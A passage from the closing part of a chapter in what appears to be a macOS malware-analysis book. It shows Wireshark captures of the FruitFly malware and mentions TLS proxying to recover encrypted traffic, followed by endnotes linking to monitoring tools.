<img alt="Wireshark shows FruitFly’s install path to be located in Users/user/fpsau_d." class="" src="image_fi/501942c07/f07004.png"/>
<figcaption><p><a id="figure7-4">Figure 7-4</a>: Using Wireshark to uncover capabilities, in this case a command that returns the malware’s location on an infected system (FruitFly)</p></figcaption>
</figure>
<p>In another instance, Wireshark reveals the malware exfiltrating screen captures as <em>.png</em> files (<a href="#figure7-5" id="figureanchor7-5">Figure 7-5</a>).</p>
<figure>
<img alt="Wireshark shows FruitFly taking screen captures, as shown by the .png files." class="" src="image_fi/501942c07/f07005.png"/>
<figcaption><p><a id="figure7-5">Figure 7-5</a>: Using Wireshark to uncover capabilities, in this case a command that returns a screen capture of the infected system (FruitFly)</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_163" title="163"/>For more information about Wireshark, including how to craft capture-and-display filters, see the official Wireshark Wiki page.<sup class="endnote"><a href="#c07-endnote-6" id="c07-noteref-6">6</a></sup></p>
<p>And what if the network traffic generated by malware is encrypted, such as via SSL/TLS? Well, in this case, a network monitor in its default configuration may be of little help, as it will be unable to decrypt the malicious traffic. But not to worry—by leveraging a proxy that installs its own root certificate and “man in the middles” the network communications, the plaintext traffic can be recovered. For more information on this technique, including the specific setup and configuration of such a proxy, see “SSL Proxying.”<sup class="endnote"><a href="#c07-endnote-7" id="c07-noteref-7">7</a></sup></p>
<h2 id="h1-501942c07-0004">Up Next</h2>
<p class="BodyFirst">In this chapter, we discussed the process, file, and network monitors essential to the malware analyst’s toolkit. However, you’ll sometimes need more powerful tools. For example, if a malware’s network traffic is end-to-end encrypted, a network monitor may be of little use. Sophisticated samples may also attempt to thwart dynamic monitoring tools with anti-analysis logic. Good news: we have another dynamic analysis tool in our arsenal, the debugger. In the next chapter, we’ll dive into the world of debugging, arguably the most thorough way to analyze even the most complex malware. </p>
<h2 id="h1-501942c07-0005">Endnotes</h2>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c07-noteref-1" id="c07-endnote-1">1</a></sup>	Phil Stokes, “How to Reverse Malware on macOS Without Getting Infected,” <em>SentinelOne blog</em>, April 4, 2019, <a class="LinkURL" href="https://www.sentinelone.com/blog/how-to-reverse-macos-malware-part-one/">https://www.sentinelone.com/blog/how-to-reverse-macos-malware-part-one/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c07-noteref-2" id="c07-endnote-2">2</a></sup>	ProcessMonitor, <a class="LinkURL" href="https://objective-see.com/products/utilities.html#ProcessMonitor/">https://objective-see.com/products/utilities.html#ProcessMonitor/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c07-noteref-3" id="c07-endnote-3">3</a></sup>	FileMonitor, <a class="LinkURL" href="https://objective-see.com/products/utilities.html#FileMonitor/">https://objective-see.com/products/utilities.html#FileMonitor/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c07-noteref-4" id="c07-endnote-4">4</a></sup>	Netiquette, <a class="LinkURL" href="https://objective-see.com/products/netiquette.html">https://objective-see.com/products/netiquette.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c07-noteref-5" id="c07-endnote-5">5</a></sup>	Wireshark, <a class="LinkURL" href="https://www.wireshark.org/">https://www.wireshark.org/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c07-noteref-6" id="c07-endnote-6">6</a></sup>	Wireshark Wiki, <a class="LinkURL" href="https://gitlab.com/wireshark/wireshark/-/wikis/home/">https://gitlab.com/wireshark/wireshark/-/wikis/home/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c07-noteref-7" id="c07-endnote-7">7</a></sup>	“SSL Proxying,” <em>Charles</em>, <a class="LinkURL" href="https://www.charlesproxy.com/documentation/proxying/ssl-proxying/">https://www.charlesproxy.com/documentation/proxying/ssl-proxying/</a>.</p></aside>
</section>
</body>
</html>